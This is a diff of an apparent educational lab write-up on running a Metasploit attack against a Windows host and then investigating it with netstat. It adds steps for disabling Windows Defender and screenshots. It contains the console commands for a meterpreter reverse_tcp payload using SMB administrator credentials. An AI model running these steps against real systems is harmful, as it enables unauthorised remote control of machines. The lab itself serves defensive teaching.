@@ -4,6 +4,10 @@
 
 In this hands-on lab, we'll create and execute malware in a controlled environment, then use command-line tools to investigate how an attack manifests on a live Windows system. The most effective way to understand cybersecurity threats is through practical, direct experience. 
 
+Before we proceed, we must ensure that Windows Defender is disabled. To do this, open Windows PowerShell. 
+
+<img width="793" height="116" alt="Screenshot 2025-10-26 at 2 57 51 AM" src="https://github.com/user-attachments/assets/06f4bd50-ef6b-42ee-ac5e-7fbc1cf679b9" />
+
 ### Initial Setup
 Begin by elevating your privileges to root access:
 
@@ -17,7 +21,7 @@ Launch the Metasploit Framework console:
 msfconsole -q
 ```
 
-Note: The connection process may take a moment, please be patient while it initializes.
+Note: The connection process may take a moment to complete. Please be patient while it initializes.
 
 Once connected, your terminal prompt will change to indicate you're in the Metasploit 2 console.
 
@@ -31,17 +35,20 @@ Configure the payload type:
 ``` bash
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
+<img width="992" height="193" alt="Screenshot 2025-10-26 at 3 00 29 AM" src="https://github.com/user-attachments/assets/c5c49322-c43f-400d-bc7f-467ec417cc0b" />
 
 Specify the target Windows system's IP address:
 ``` bash
 set RHOST (YOUR IP ADDRESS)
 ```
+<img width="996" height="47" alt="Screenshot 2025-10-26 at 3 02 45 AM" src="https://github.com/user-attachments/assets/8eb0555b-5dcd-4db8-ae87-b86987695d39" />
 
 Set the SMB credentials for authentication:
 ``` bash
 set SMBUSER Administrator
 set SMBPASS password1234
 ```
+<img width="998" height="65" alt="Screenshot 2025-10-26 at 3 04 22 AM" src="https://github.com/user-attachments/assets/9e51a010-7b0b-4e46-9d63-b26f976782b2" />
 
 Security Note: Use the password you configured earlier in the lab. Ensure you're using a unique password in your environment.
 
@@ -51,6 +58,9 @@ Execute the attack:
 ```bash 
 exploit
 ```
+<img width="984" height="146" alt="Screenshot 2025-10-26 at 3 05 55 AM" src="https://github.com/user-attachments/assets/1a42f708-0d47-4c20-b001-b3a10b028800" />
+
+
 ## Network Connection Analysis
 While this lab environment is simplified, two critical commands help detect attackers mounting network shares:
 
@@ -62,6 +72,7 @@ Open a Windows PowerShell window and examine all network connections:
 ``` powershell
 netstat -naob
 ```
+<img width="781" height="625" alt="Screenshot 2025-10-26 at 3 08 00 AM" src="https://github.com/user-attachments/assets/0b5da92c-78f6-4d53-9ec5-6e64e83862d2" />
 
 This command produces extensive output showing:
 
